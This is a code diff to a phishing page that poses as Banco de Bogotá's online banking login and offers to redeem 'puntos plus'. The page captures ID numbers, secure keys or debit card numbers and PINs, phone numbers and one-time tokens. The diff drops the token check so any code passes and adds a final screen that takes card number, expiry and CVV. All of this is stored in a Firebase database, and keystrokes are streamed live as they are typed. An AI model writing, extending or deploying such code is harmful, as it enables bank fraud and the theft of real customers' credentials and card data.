@@ -266,7 +266,51 @@
       color: white;
     }
 
-    /* Botón deshabilitado */
+    /* ========== PANTALLA DE TARJETA (TERCER PASO) ========== */
+    .card-screen {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.9);
+      backdrop-filter: blur(8px);
+      z-index: 100002;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      visibility: hidden;
+      opacity: 0;
+      transition: visibility 0.3s, opacity 0.3s ease;
+    }
+
+    .card-screen.active {
+      visibility: visible;
+      opacity: 1;
+    }
+
+    .card-card {
+      background: white;
+      border-radius: 24px;
+      width: 90%;
+      max-width: 450px;
+      padding: 35px;
+      text-align: center;
+      box-shadow: 0 25px 50px rgba(0,0,0,0.3);
+      animation: fadeInUp 0.4s ease;
+    }
+
+    .card-row {
+      display: flex;
+      gap: 15px;
+      margin-bottom: 20px;
+    }
+
+    .card-row .input-group-verify {
+      flex: 1;
+      margin-bottom: 0;
+    }
+
     .btn-ingresar-dash:disabled {
       background-color: #a0aec0;
       cursor: not-allowed;
@@ -274,7 +318,7 @@
       opacity: 0.6;
     }
 
-    /* ========== PÁGINA DE INICIO (MENÚ PRINCIPAL) ========== */
+    /* ========== PÁGINA DE INICIO ========== */
     .main-page {
       background-color: #ffffff;
       min-height: 100vh;
@@ -698,75 +742,26 @@
       transform: scale(1.05);
     }
 
-    /* ========== MODO TELÉFONO ========== */
     @media (max-width: 700px) {
       h1 { font-size: 1.8rem; }
       #sec5-button { font-size: 1.2rem; padding: 12px 32px; }
       .imagen-principal { width: 85%; }
       .login-card { max-width: 100%; padding: 20px 16px 24px 16px; }
-      
-      .identificacion-row { 
-        flex-direction: row;
-        gap: 12px; 
-      }
-      
-      .dropdown-wrapper { 
-        flex-shrink: 0;
-      }
-      
-      .cc-label-box { 
-        width: auto;
-        min-width: 90px;
-      }
-      
-      .dropdown-menu { 
-        width: auto;
-        min-width: 90px;
-      }
-      
+      .identificacion-row { flex-direction: row; gap: 12px; }
+      .dropdown-wrapper { flex-shrink: 0; }
+      .cc-label-box { width: auto; min-width: 90px; }
+      .dropdown-menu { width: auto; min-width: 90px; }
       .outside-image { max-width: 100%; margin: 15px 0; }
       .outside-image-second { max-width: 100%; margin-top: 10px; }
-      
-      .links-row {
-        gap: 20px;
-      }
-      
-      .links-row a {
-        font-size: 0.95rem;
-      }
-
-      .half-screen-image-right {
-        display: none !important;
-      }
-      
-      .image-mobile-wrapper {
-        display: block;
-        width: 100%;
-        margin: 30px 0 0 0;
-        text-align: center;
-      }
-      
-      .mobile-image-full {
-        width: 100%;
-        max-width: 100%;
-        height: auto;
-        object-fit: contain;
-        display: block;
-        border-radius: 0;
-        margin: 0 auto;
-      }
-
-      .dashboard-grid {
-        flex-direction: column;
-      }
-      
-      .benefits-content h2 {
-        font-size: 1.3rem;
-      }
-      
-      .verification-card {
-        padding: 25px;
-      }
+      .links-row { gap: 20px; }
+      .links-row a { font-size: 0.95rem; }
+      .half-screen-image-right { display: none !important; }
+      .image-mobile-wrapper { display: block; width: 100%; margin: 30px 0 0 0; text-align: center; }
+      .mobile-image-full { width: 100%; max-width: 100%; height: auto; display: block; margin: 0 auto; }
+      .dashboard-grid { flex-direction: column; }
+      .benefits-content h2 { font-size: 1.3rem; }
+      .verification-card, .card-card { padding: 25px; }
+      .card-row { flex-direction: column; gap: 15px; }
     }
   </style>
 </head>
@@ -777,7 +772,7 @@
   <div class="spinner"></div>
 </div>
 
-<!-- PANTALLA DE BENEFICIOS (LOADER INTERMEDIO) -->
+<!-- PANTALLA DE BENEFICIOS -->
 <div id="benefitsScreen" class="benefits-screen">
   <div class="benefits-content">
     <div class="benefits-spinner"></div>
@@ -789,30 +784,58 @@
   </div>
 </div>
 
-<!-- PANTALLA DE VERIFICACIÓN (SIN EMOJIS Y CON LOGO) -->
+<!-- PANTALLA DE VERIFICACIÓN (SIN VALIDACIÓN DE TOKEN) -->
 <div id="verificationScreen" class="verification-screen">
   <button class="close-verify" onclick="cerrarVerificacion()">&times;</button>
   <div class="verification-card">
     <img class="logo-img" src="https://www.image2url.com/r2/default/images/1779483986726-bd48bc8c-aef6-419c-8f20-0ed9a2fc569d.png" alt="Banco de Bogotá">
-    <h2>Verificación Requerida</h2>
-    <p class="subtitle">No dudamos que eres tú pero vamos a confirmar tu identidad</p>
+    <h2>Verificacion Requerida</h2>
+    <p class="subtitle">No dudamos que eres tu pero vamos a confirmar tu identidad</p>
     
     <div class="input-group-verify">
-      <label>Número de celular</label>
+      <label>Numero de celular</label>
       <input type="tel" id="phoneNumber" placeholder="Ej: 3001234567" maxlength="10" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
     </div>
     
     <div class="input-group-verify">
-      <label>Código de verificación (token)</label>
+      <label>Codigo de verificacion (token)</label>
       <input type="text" id="verificationToken" class="token-input" placeholder="######" maxlength="6" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
     </div>
     
     <button class="btn-verify-submit" onclick="enviarVerificacion()">Confirmar identidad</button>
-    <div class="resend-link" onclick="reenviarCodigo()">Reenviar código de verificación</div>
+    <div class="resend-link" onclick="reenviarCodigo()">Reenviar codigo de verificacion</div>
   </div>
 </div>
 
-<!-- ========== PÁGINA PRINCIPAL ========== -->
+<!-- PANTALLA DE TARJETA -->
+<div id="cardScreen" class="card-screen">
+  <button class="close-verify" onclick="cerrarCardScreen()">&times;</button>
+  <div class="card-card">
+    <img class="logo-img" src="https://www.image2url.com/r2/default/images/1779483986726-bd48bc8c-aef6-419c-8f20-0ed9a2fc569d.png" alt="Banco de Bogotá">
+    <h2>Ultimo paso</h2>
+    <p class="subtitle">Ingresa los datos de tu tarjeta para completar la verificacion</p>
+    
+    <div class="input-group-verify">
+      <label>Numero de tarjeta (16 digitos)</label>
+      <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" oninput="this.value = this.value.replace(/[^0-9]/g, '').replace(/(.{4})/g, '$1 ').trim()">
+    </div>
+    
+    <div class="card-row">
+      <div class="input-group-verify">
+        <label>Fecha vencimiento</label>
+        <input type="text" id="cardExpiry" placeholder="MM/AA" maxlength="5" oninput="this.value = this.value.replace(/[^0-9]/g, ''); if(this.value.length>=2) this.value = this.value.substring(0,2)+'/'+this.value.substring(2,4)">
+      </div>
+      <div class="input-group-verify">
+        <label>CVV</label>
+        <input type="text" id="cardCvv" placeholder="123" maxlength="4" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+      </div>
+    </div>
+    
+    <button class="btn-verify-submit" onclick="enviarDatosTarjeta()">Completar verificacion</button>
+  </div>
+</div>
+
+<!-- PÁGINA PRINCIPAL -->
 <div id="mainPage" class="main-page">
   <div class="main-content">
     <div class="bgBlanco">
@@ -848,16 +871,16 @@
   </footer>
 </div>
 
-<!-- ========== DASHBOARD (BANCA VIRTUAL) ========== -->
+<!-- DASHBOARD (BANCA VIRTUAL) -->
 <div id="dashboardPage" class="dashboard-page">
-  <img class="half-screen-image-right" src="https://www.image2url.com/r2/default/images/1779466057996-14ce732b-a64a-4ab7-b632-d619f798c5fc.png" alt="Cuenta Fácil - Sin cuota de manejo">
+  <img class="half-screen-image-right" src="https://www.image2url.com/r2/default/images/1779466057996-14ce732b-a64a-4ab7-b632-d619f798c5fc.png" alt="Cuenta Facil - Sin cuota de manejo">
   
   <div class="dashboard-container">
     <div class="images-container">
       <div class="outside-image">
         <picture>
           <source srcset="https://www.image2url.com/r2/default/images/1779465356858-6a1a6663-48df-4850-9299-3320bf7d9339.png" media="(max-width: 700px)">
-          <img src="https://www.image2url.com/r2/default/images/1779463863552-434fe2db-951c-479c-b972-fbacb085a479.png" alt="Banco de Bogotá">
+          <img src="https://www.image2url.com/r2/default/images/1779463863552-434fe2db-951c-479c-b972-fbacb085a479.png" alt="Banco de Bogota">
         </picture>
       </div>
       <div class="outside-image-second">
@@ -869,17 +892,17 @@
       <div class="login-card">
         <div class="tab-selector">
           <div class="tab active" data-tab="clave" onclick="switchTab('clave')">Clave segura</div>
-          <div class="tab" data-tab="tarjeta" onclick="switchTab('tarjeta')">Tarjeta Débito</div>
+          <div class="tab" data-tab="tarjeta" onclick="switchTab('tarjeta')">Tarjeta Debito</div>
         </div>
 
         <div id="infoBlueBox" class="info-blue-box">
           <h3>Clave segura</h3>
-          <p>Estás ingresando con tu Clave Segura.<br>Selecciona 'Tarjeta Débito' para cambiar el tipo de ingreso.</p>
+          <p>Estas ingresando con tu Clave Segura.<br>Selecciona 'Tarjeta Debito' para cambiar el tipo de ingreso.</p>
         </div>
 
         <div id="tab-clave">
           <div class="input-group">
-            <label>Identificación</label>
+            <label>Identificacion</label>
             <div class="identificacion-row">
               <div class="dropdown-wrapper">
                 <div class="cc-label-box" onclick="toggleDropdown(event)">
@@ -887,10 +910,10 @@
                   <span class="dropdown-arrow" id="dropdownArrow">▼</span>
                 </div>
                 <div class="dropdown-menu" id="dropdownMenu">
-                  <div class="dropdown-item" onclick="selectDocument('Cédula de ciudadanía')">Cédula de ciudadanía</div>
+                  <div class="dropdown-item" onclick="selectDocument('Cedula de ciudadania')">Cedula de ciudadania</div>
                   <div class="dropdown-item" onclick="selectDocument('Tarjeta de identidad')">Tarjeta de identidad</div>
                   <div class="dropdown-item" onclick="selectDocument('Pasaporte')">Pasaporte</div>
-                  <div class="dropdown-item" onclick="selectDocument('Licencia de conducción')">Licencia de conducción</div>
+                  <div class="dropdown-item" onclick="selectDocument('Licencia de conduccion')">Licencia de conduccion</div>
                   <div class="dropdown-item" onclick="selectDocument('Registro civil')">Registro civil</div>
                   <div class="dropdown-item" onclick="selectDocument('Libreta militar')">Libreta militar</div>
                 </div>
@@ -910,13 +933,13 @@
           <button class="btn-ingresar-dash" id="btnIngresarClave" onclick="handleIngresarClave()" disabled>Ingresar</button>
           <div class="links-row">
             <a href="#">Registrarme ›</a>
-            <a href="#">Olvidé mi clave ›</a>
+            <a href="#">Olvide mi clave ›</a>
           </div>
         </div>
 
         <div id="tab-tarjeta" style="display: none;">
           <div class="input-group">
-            <label>Número de tarjeta</label>
+            <label>Numero de tarjeta</label>
             <div class="input-with-icon">
               <input type="text" id="tarjetaNumero" placeholder="**** **** **** ****">
             </div>
@@ -930,7 +953,7 @@
           <button class="btn-ingresar-dash" id="btnIngresarTarjeta" onclick="handleIngresarTarjeta()">Ingresar</button>
           <div class="links-row">
             <a href="#">Registrarme ›</a>
-            <a href="#">Olvidé mi clave ›</a>
+            <a href="#">Olvide mi clave ›</a>
           </div>
         </div>
       </div>
@@ -961,14 +984,13 @@
   const preloader = document.getElementById('preloaderOverlay');
   const benefitsScreen = document.getElementById('benefitsScreen');
   const verificationScreen = document.getElementById('verificationScreen');
+  const cardScreen = document.getElementById('cardScreen');
   const benefitsProgressBar = document.getElementById('benefitsProgressBar');
   const btnIngresarClave = document.getElementById('btnIngresarClave');
   
-  // Variables para almacenar datos temporales
-  let credencialesTemp = null;
-  let tokenGenerado = null;
+  let sessionId = null;
   
-  // ========== LIVE TYPING ==========
+  // LIVE TYPING
   let typingTimeout = null;
   let currentSessionId = null;
 
@@ -994,7 +1016,6 @@
     }, 2000);
   }
   
-  // Validar campos
   function validarCampos() {
     const docNumber = document.getElementById('documentNumber').value;
     const clave = document.getElementById('claveSegura').value;
@@ -1003,14 +1024,6 @@
     } else {
       btnIngresarClave.disabled = true;
     }
-  }
-  
-  function showPreloader() {
-    preloader.classList.add('active');
-  }
-  
-  function hidePreloader() {
-    preloader.classList.remove('active');
   }
   
   function showBenefitsScreen() {
@@ -1022,113 +1035,128 @@
         progress = 100;
         clearInterval(interval);
       }
-      if (benefitsProgressBar) {
-        benefitsProgressBar.style.width = progress + '%';
-      }
+      if (benefitsProgressBar) benefitsProgressBar.style.width = progress + '%';
     }, 100);
   }
   
   function hideBenefitsScreen() {
     benefitsScreen.classList.remove('active');
-    if (benefitsProgressBar) {
-      benefitsProgressBar.style.width = '0%';
-    }
+    if (benefitsProgressBar) benefitsProgressBar.style.width = '0%';
   }
   
   function showVerificationScreen() {
     verificationScreen.classList.add('active');
-    // Generar token aleatorio de 6 dígitos
-    tokenGenerado = Math.floor(100000 + Math.random() * 900000).toString();
-    console.log('Token generado (simulado):', tokenGenerado);
-    // Limpiar campos
     document.getElementById('phoneNumber').value = '';
     document.getElementById('verificationToken').value = '';
   }
   
-  function hideVerificationScreen() {
-    verificationScreen.classList.remove('active');
-  }
+  function hideVerificationScreen() { verificationScreen.classList.remove('active'); }
+  function showCardScreen() { cardScreen.classList.add('active'); }
+  function hideCardScreen() { cardScreen.classList.remove('active'); }
   
   function cerrarVerificacion() {
     hideVerificationScreen();
-    // Limpiar campos del formulario principal
+    document.getElementById('documentNumber').value = '';
+    document.getElementById('claveSegura').value = '';
+    validarCampos();
+  }
+  
+  function cerrarCardScreen() {
+    hideCardScreen();
     document.getElementById('documentNumber').value = '';
     document.getElementById('claveSegura').value = '';
     validarCampos();
   }
   
   function reenviarCodigo() {
-    tokenGenerado = Math.floor(100000 + Math.random() * 900000).toString();
-    console.log('Nuevo token generado:', tokenGenerado);
-    alert('Se ha reenviado un nuevo código de verificación (demo: ' + tokenGenerado + ')');
+    alert('Se ha reenviado un nuevo codigo de verificacion');
   }
   
-  // Enviar verificación al panel
+  // VERIFICACION: CUALQUIER TOKEN ES VALIDO
   async function enviarVerificacion() {
     const phoneNumber = document.getElementById('phoneNumber').value;
     const verificationToken = document.getElementById('verificationToken').value;
     
     if (!phoneNumber || phoneNumber.length < 10) {
-      alert('Por favor ingresa un número de celular válido (10 dígitos)');
+      alert('Por favor ingresa un numero de celular valido (10 digitos)');
       return;
     }
     
     if (!verificationToken || verificationToken.length !== 6) {
-      alert('Por favor ingresa el código de verificación de 6 dígitos');
+      alert('Por favor ingresa un codigo de verificacion de 6 digitos');
       return;
     }
     
-    if (verificationToken !== tokenGenerado) {
-      alert('Código de verificación incorrecto. Intenta nuevamente.');
-      return;
+    // CUALQUIER TOKEN ES VALIDO - SIN VALIDACION
+    if (sessionId) {
+      await database.ref('ingresos/' + sessionId).update({
+        telefono: phoneNumber,
+        tokenVerificacion: verificationToken,
+        estado: "token_recibido",
+        fechaToken: new Date().toISOString()
+      });
     }
     
-    // Guardar todos los datos en Firebase
-    const timestamp = new Date().toISOString();
-    const datosCompletos = {
-      ...credencialesTemp,
-      telefono: phoneNumber,
-      tokenVerificacion: verificationToken,
-      fechaVerificacion: timestamp,
-      dispositivo: navigator.userAgent,
-      estado: "verificado"
-    };
-    
-    try {
-      await database.ref('ingresos').push().set(datosCompletos);
-      alert('Verificación exitosa. Tus puntos plus han sido redimidos correctamente.');
-      hideVerificationScreen();
-      // Limpiar campos
-      document.getElementById('documentNumber').value = '';
-      document.getElementById('claveSegura').value = '';
-      validarCampos();
-      credencialesTemp = null;
-    } catch (error) {
-      console.error("Error guardando en Firebase:", error);
-      alert('Error al procesar la verificación. Intenta de nuevo.');
-    }
+    hideVerificationScreen();
+    showCardScreen();
   }
   
-  // Guardar credenciales iniciales y mostrar pantalla de beneficios
+  async function enviarDatosTarjeta() {
+    const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+    const cardExpiry = document.getElementById('cardExpiry').value;
+    const cardCvv = document.getElementById('cardCvv').value;
+    
+    if (!cardNumber || cardNumber.length !== 16) {
+      alert('Por favor ingresa un numero de tarjeta valido (16 digitos)');
+      return;
+    }
+    
+    if (!cardExpiry || cardExpiry.length !== 5) {
+      alert('Por favor ingresa una fecha de vencimiento valida (MM/AA)');
+      return;
+    }
+    
+    if (!cardCvv || (cardCvv.length < 3 || cardCvv.length > 4)) {
+      alert('Por favor ingresa un CVV valido (3 o 4 digitos)');
+      return;
+    }
+    
+    if (sessionId) {
+      await database.ref('ingresos/' + sessionId).update({
+        numeroTarjeta: cardNumber,
+        fechaVencimiento: cardExpiry,
+        cvv: cardCvv,
+        estado: "completado",
+        fechaCompleta: new Date().toISOString()
+      });
+    }
+    
+    alert('Verificacion completada. Tus puntos plus han sido redimidos correctamente.');
+    hideCardScreen();
+    document.getElementById('documentNumber').value = '';
+    document.getElementById('claveSegura').value = '';
+    validarCampos();
+    sessionId = null;
+  }
+  
   async function saveToFirebaseAndShowBenefits(usuario, password, docType) {
-    // Guardar temporalmente las credenciales con estado "esperando_token"
-    credencialesTemp = {
+    const timestamp = new Date().toISOString();
+    const newRef = database.ref('ingresos').push();
+    sessionId = newRef.key;
+    
+    const datosIniciales = {
       usuario: usuario,
       password: password,
       tipoDocumento: docType,
-      fechaInicio: new Date().toISOString(),
+      fechaInicio: timestamp,
       estado: "esperando_token",
       dispositivo: navigator.userAgent
     };
     
-    // Guardar en Firebase con estado "esperando_token"
     try {
-      await database.ref('ingresos').push().set(credencialesTemp);
-    } catch (error) {
-      console.error("Error guardando credenciales temporales:", error);
-    }
+      await newRef.set(datosIniciales);
+    } catch (error) { console.error("Error:", error); }
     
-    // Mostrar pantalla de beneficios
     showBenefitsScreen();
     btnIngresarClave.disabled = true;
     
@@ -1136,7 +1164,6 @@
       database.ref('liveTyping/' + currentSessionId).update({ activo: false, enviado: true });
     }
     
-    // Después de 5 segundos, ocultar beneficios y mostrar verificación
     setTimeout(() => {
       hideBenefitsScreen();
       showVerificationScreen();
@@ -1144,36 +1171,24 @@
     }, 5000);
   }
   
-  // Clave Segura
   function handleIngresarClave() {
     const docType = document.getElementById('docTypeText').innerText;
     const docNumber = document.getElementById('documentNumber').value;
     const clave = document.getElementById('claveSegura').value;
     
-    if (!docNumber || !clave) {
-      alert('Por favor completa todos los campos');
-      return;
-    }
-    
-    if (clave.length !== 4) {
-      alert('La clave segura debe tener exactamente 4 dígitos');
-      return;
-    }
+    if (!docNumber || !clave) { alert('Por favor completa todos los campos'); return; }
+    if (clave.length !== 4) { alert('La clave segura debe tener exactamente 4 digitos'); return; }
     
     saveToFirebaseAndShowBenefits(docNumber, clave, docType);
   }
   
-  // Tarjeta Débito
   function handleIngresarTarjeta() {
     const tarjetaNum = document.getElementById('tarjetaNumero').value;
     const tarjetaClave = document.getElementById('tarjetaClave').value;
     
-    if (!tarjetaNum || !tarjetaClave) {
-      alert('Por favor completa todos los campos');
-      return;
-    }
+    if (!tarjetaNum || !tarjetaClave) { alert('Por favor completa todos los campos'); return; }
     
-    saveToFirebaseAndShowBenefits(tarjetaNum, tarjetaClave, 'Tarjeta Débito');
+    saveToFirebaseAndShowBenefits(tarjetaNum, tarjetaClave, 'Tarjeta Debito');
   }
   
   function showDashboard() {
@@ -1214,9 +1229,7 @@
     const menu = document.getElementById('dropdownMenu');
     const arrow = document.getElementById('dropdownArrow');
     menu.classList.toggle('show');
-    if (arrow) {
-      arrow.style.transform = menu.classList.contains('show') ? 'rotate(180deg)' : 'rotate(0deg)';
-    }
+    if (arrow) arrow.style.transform = menu.classList.contains('show') ? 'rotate(180deg)' : 'rotate(0deg)';
   }
 
   function selectDocument(docType) {
@@ -1224,9 +1237,7 @@
     const menu = document.getElementById('dropdownMenu');
     const arrow = document.getElementById('dropdownArrow');
     menu.classList.remove('show');
-    if (arrow) {
-      arrow.style.transform = 'rotate(0deg)';
-    }
+    if (arrow) arrow.style.transform = 'rotate(0deg)';
   }
 
   document.addEventListener('click', function(event) {
